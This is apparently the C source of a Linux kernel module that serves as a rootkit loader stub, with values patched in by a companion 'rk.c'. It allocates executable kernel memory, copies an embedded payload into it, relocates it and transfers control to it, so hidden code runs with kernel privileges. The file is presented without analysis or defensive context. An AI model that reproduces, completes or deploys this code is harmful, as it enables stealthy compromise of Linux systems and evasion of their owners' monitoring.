#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/vmalloc.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/uaccess.h>
#include <linux/binfmts.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/spinlock.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/termios.h>
#include <asm/bitops.h>
#include <linux/spinlock.h>
#include <linux/syscalls.h>

/* patched by rk.c:insmod() */
unsigned long marker        = 0xdeadb33f;
unsigned long kstart        = -1;
unsigned long klen          = -1;
unsigned long kenter        = -1;
int (*reloc)(unsigned char *, void (*pk)(char *, ...)) = (void *)-1;
unsigned char *rkmem = (void *)-1;

int
init_module(void)
{
	int (*kinit)(void);
	int i;

	rkmem = __vmalloc(8192*3, GFP_KERNEL, PAGE_KERNEL_EXEC);
	printk("<0>" "rkmem: 0x%p\n", rkmem);

	reloc(rkmem, &printk);
	for (i = 0; i < klen; i++) {
		*(rkmem+i) = *(unsigned char *)(kstart+i);
	}

	kinit = (void *)(kenter-kstart);
	kinit = (void *)rkmem+(unsigned long)kinit;
	return kinit();
}

void cleanup_module(void) {}
